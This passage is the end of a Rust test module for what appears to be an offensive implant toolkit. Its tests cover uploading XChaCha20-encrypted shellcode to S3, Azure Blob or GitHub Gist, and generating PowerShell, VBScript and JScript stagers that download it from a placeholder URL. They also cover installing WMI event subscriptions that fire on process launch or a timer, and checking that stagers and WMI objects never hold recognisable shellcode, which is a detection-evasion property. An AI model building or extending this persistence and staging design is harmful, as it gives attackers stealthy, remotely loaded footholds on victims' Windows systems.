        let url = cloud_url(&config, "key456");
        assert_eq!(url, "https://mybucket.s3.us-east-1.amazonaws.com/key456");
    }

    #[test]
    fn test_cloud_url_github() {
        let config = CloudStorageConfig::GitHubGist {
            token: "ghp_xxx".to_string(),
            description: None,
            public: false,
        };
        let url = cloud_url(&config, "gist789");
        assert_eq!(url, "https://api.github.com/gists/gist789");
    }

    #[test]
    fn test_stager_generation() {
        let url = "https://example.com/blob";
        let key = [0xAB; 32];
        let stager = generate_stager(url, &key).unwrap();

        assert!(stager.command.contains("System.Net.WebClient"));
        assert!(stager.command.contains(url));
        assert!(!stager.encoded_command.is_empty());
        assert!(!stager.key_hex.is_empty());
        assert_eq!(stager.url, url);
    }

    #[test]
    fn test_stager_no_shellcode() {
        let shellcode = vec![0x90u8; 256]; // NOP sled
        let config = CloudStorageConfig::AzureBlob {
            account: "test".to_string(),
            container: "data".to_string(),
            sas_token: "?sv=...".to_string(),
        };

        let (_upload, stager) = prepare_cloud_payload(&shellcode, &config).unwrap();

        // The stager command must NOT contain the raw shellcode
        assert!(!stager.command.contains(&hex::encode(&shellcode)));
        // The stager command must NOT contain base64-encoded shellcode directly
        assert!(!stager.command.contains(&base64::encode(&shellcode)));
    }

    #[test]
    fn test_prepare_cloud_payload() {
        let shellcode = vec![0xCCu8; 100];
        let config = CloudStorageConfig::AwsS3 {
            bucket: "mybucket".to_string(),
            region: "us-west-2".to_string(),
            auth: "Bearer xxx".to_string(),
        };

        let (upload, stager) = prepare_cloud_payload(&shellcode, &config).unwrap();

        assert!(upload.url.contains("mybucket"));
        assert!(upload.url.contains("us-west-2"));
        assert!(upload.encrypted_size > shellcode.len());
        assert_eq!(upload.plaintext_size, 100);
        assert_eq!(upload.backend, "AwsS3");
        assert!(!stager.command.is_empty());
    }

    #[test]
    fn test_install_wmi_subscription_process_trigger() {
        let config = WmiSubscriptionConfig {
            name: "test_sub".to_string(),
            namespace: "ROOT\\subscription".to_string(),
            trigger: WmiTriggerType::ProcessCreation {
                process_name: "explorer.exe".to_string(),
                poll_interval: 10,
            },
            consumer_type: WmiConsumerType::CommandLine,
            cloud_config: CloudStorageConfig::GitHubGist {
                token: "ghp_test".to_string(),
                description: Some("test".to_string()),
                public: false,
            },
            payload: vec![0x90u8; 50],
            name_seed: Some(42),
            working_directory: Some("C:\\Windows\\Temp".to_string()),
        };

        let result = install_wmi_subscription(&config).unwrap();

        assert!(result.filter_name.starts_with("OrchestraFilter_"));
        assert!(result.consumer_name.starts_with("OrchestraConsumer_"));
        assert!(result.wql_query.contains("explorer.exe"));
        assert!(result.wql_query.contains("WITHIN 10"));
        assert_eq!(result.consumer_type, "CommandLineEventConsumer");
        assert_eq!(result.cloud_backend, "GitHubGist");
    }

    #[test]
    fn test_install_wmi_subscription_timer_trigger() {
        let config = WmiSubscriptionConfig {
            name: "timer_sub".to_string(),
            namespace: "ROOT\\subscription".to_string(),
            trigger: WmiTriggerType::Timer {
                timer_id: "OrchestraTimer".to_string(),
                interval: 60,
                start_time: None,
            },
            consumer_type: WmiConsumerType::ActiveScript {
                engine: "VBScript".to_string(),
            },
            cloud_config: CloudStorageConfig::AzureBlob {
                account: "storage".to_string(),
                container: "payloads".to_string(),
                sas_token: "?sv=...".to_string(),
            },
            payload: vec![0xCCu8; 200],
            name_seed: None,
            working_directory: None,
        };

        let result = install_wmi_subscription(&config).unwrap();

        assert!(result.wql_query.contains("OrchestraTimer"));
        assert_eq!(result.consumer_type, "ActiveScriptEventConsumer");
        assert_eq!(result.cloud_backend, "AzureBlob");
    }

    #[test]
    fn test_remove_wmi_subscription() {
        let result = remove_wmi_subscription("OrchestraFilter_abc", "OrchestraConsumer_def").unwrap();

        assert_eq!(result.removed_objects.len(), 3);
        assert!(result.failed_objects.is_empty());
        // Verify removal order: binding, consumer, filter
        assert!(result.removed_objects[0].contains("FilterToConsumerBinding"));
        assert!(result.removed_objects[1].contains("CommandLineEventConsumer"));
        assert!(result.removed_objects[2].contains("EventFilter"));
    }

    #[test]
    fn test_no_shellcode_in_wmi_objects() {
        // Verify that the WMI subscription result contains no shellcode
        let shellcode = vec![0x90; 256];
        let config = WmiSubscriptionConfig {
            name: "clean_test".to_string(),
            namespace: "ROOT\\subscription".to_string(),
            trigger: WmiTriggerType::ProcessCreation {
                process_name: "notepad.exe".to_string(),
                poll_interval: 5,
            },
            consumer_type: WmiConsumerType::CommandLine,
            cloud_config: CloudStorageConfig::AwsS3 {
                bucket: "test".to_string(),
                region: "us-east-1".to_string(),
                auth: "auth".to_string(),
            },
            payload: shellcode.clone(),
            name_seed: Some(999),
            working_directory: None,
        };

        let result = install_wmi_subscription(&config).unwrap();

        // The result itself should not contain raw shellcode
        let result_json = serde_json::to_string(&result).unwrap();
        let shellcode_hex = hex::encode(&shellcode);
        assert!(
            !result_json.contains(&shellcode_hex),
            "WMI subscription result must not contain raw shellcode hex"
        );
        assert!(
            !result_json.contains(&base64::encode(&shellcode)),
            "WMI subscription result must not contain base64-encoded shellcode"
        );
    }

    #[test]
    fn test_encrypted_payload_size() {
        // XChaCha20-Poly1305 adds 16 bytes for the auth tag
        let plaintext = vec![0x41; 1024];
        let (encrypted, _, _) = encrypt_payload(&plaintext).unwrap();

        // nonce(24) + ciphertext(1024) + tag(16) = 1064
        assert_eq!(encrypted.len(), 24 + 1024 + 16);
    }

    #[test]
    fn test_vbscript_stager_generation() {
        let url = "https://example.com/blob";
        let key = [0u8; 32];
        let stager = generate_vbscript_stager(url, &key);

        assert!(stager.contains("MSXML2.XMLHTTP"));
        assert!(stager.contains(url));
    }

    #[test]
    fn test_jscript_stager_generation() {
        let url = "https://example.com/blob";
        let key = [0u8; 32];
        let stager = generate_jscript_stager(url, &key);

        assert!(stager.contains("MSXML2.XMLHTTP"));
        assert!(stager.contains(url));
    }
}
